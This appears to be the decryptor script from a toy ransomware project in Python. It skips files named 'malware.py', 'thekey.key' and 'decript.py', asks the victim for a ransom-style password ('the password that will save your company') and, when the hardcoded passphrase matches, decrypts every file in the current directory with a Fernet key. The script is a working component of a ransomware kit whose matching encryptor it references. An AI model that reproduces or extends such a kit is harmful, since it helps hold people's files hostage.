import os 
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
  if file == "malware.py" or file == "thekey.key" or file == "decript.py":
    continue
  if os.path.isfile(file): 
    files.append(file)

print("scanned files encrypted", files)

with open("thekey.key", "rb") as key:
  secretkey = key.read()
passphrase = "Cy3erS3c"
upassword = input("Put the password that will save your company: ")
if upassword == passphrase:
  for file in files:
    with open(file, "rb") as thefile:
      content = thefile.read()
    content_decrypt = Fernet(secretkey).decrypt(content)
    with open(file, "wb") as thefile:
      thefile.write(content_decrypt)
      print("You have recovered all your files")
else: 
  print("Please enter the correct password")